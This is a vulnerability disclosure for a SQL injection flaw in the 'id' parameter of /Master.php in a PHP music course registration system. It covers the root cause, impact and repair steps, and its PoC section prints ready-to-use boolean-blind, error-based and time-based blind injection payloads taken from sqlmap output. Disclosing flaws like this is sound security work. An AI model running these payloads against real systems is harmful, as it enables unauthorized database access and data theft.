# A SQL injection vulnerability exists in Music Course Registration system project V1.0 /Master.php

## Vulnerability author:
liuyuanyuan

## NAME OF AFFECTED PRODUCT
PHP music course registration system project

## Vendor Homepage
https://www.sourcecodester.com/php/15362/music-class-enrollment-site-phpoop-free-source-code.html

## VERSION: 
1.0
## Software Link
https://www.sourcecodester.com/download-code?nid=15362&title=Music+Class+Enrollment+System+in+PHP%2FOOP+Free+Source+Code

## Vulnerable File
/Master.php

# PROBLEM TYPE
## Vulnerability Type
SQL injection

## Root Cause
An SQL injection vulnerability was found in the /Master.php file of the Music Course Registration System project. The cause of the problem is that the attacker injects malicious code from the parameter "id" and uses it directly in the SQL query without proper cleaning or validation. This allows attackers to forge input values, thereby manipulating SQL queries and performing unauthorized actions.

## Impact
Attackers can exploit this SQL injection vulnerability to achieve unauthorized database access, sensitive data leakage, data tampering, comprehensive system control, and even service interruption, posing a serious threat to system security and business continuity.

## DESCRIPTION
During the security review of the Music Course Registration System, I discovered a serious SQL injection vulnerability in the file "/Master.php". This vulnerability stems from inadequate validation of user input for the 'id' parameter, allowing an attacker to inject malicious SQL queries. As a result, attackers can gain unauthorized access to databases, modify or delete data, and access sensitive information. Immediate remedial action is needed to ensure system security and protect data integrity.

# Vulnerability details and POC
## Vulnerability lonameion:
'id' parameter

## Payload:
id=2' AND (SELECT 6431 FROM (SELECT(SLEEP(5)))hnlX)-- rKsm

---
Parameter: id (POST)

    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: id=2' RLIKE (SELECT (CASE WHEN (8134=8134) THEN 2 ELSE 0x28 END))-- AvJy

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=2' AND (SELECT 7824 FROM(SELECT COUNT(*),CONCAT(0x7176716b71,(SELECT (ELT(7824=7824,1))),0x717a767171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- nNIT

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=2' AND (SELECT 6431 FROM (SELECT(SLEEP(5)))hnlX)-- rKsm
---

## The following are screenshots of some specific information obtained from testing and running with the sqlmap tool:
Payload:
id=2' AND (SELECT 6431 FROM (SELECT(SLEEP(5)))hnlX)-- rKsm
![图片](https://github.com/user-attachments/assets/7070816d-6a3d-4fc4-bc3b-94d2d7851a95)
![图片](https://github.com/user-attachments/assets/99de9243-a2ac-4d66-a0e3-4aa194d3f5a4)


# Suggested repair
1.Use prepared statements and parameter binding:
Preparing statements can prevent SQL injection as they separate SQL code from user input data. When using prepare statements, the value entered by the user is treated as pure data and will not be interpreted as SQL code.

2.Input validation and filtering:
Strictly validate and filter user input data to ensure it conforms to the expected format.

3.Minimize database user permissions:
Ensure that the account used to connect to the database has the minimum necessary permissions. Avoid using accounts with advanced permissions (such as' root 'or' admin ') for daily operations.

4.Regular security audits:
Regularly conduct code and system security audits to promptly identify and fix potential security vulnerabilities.
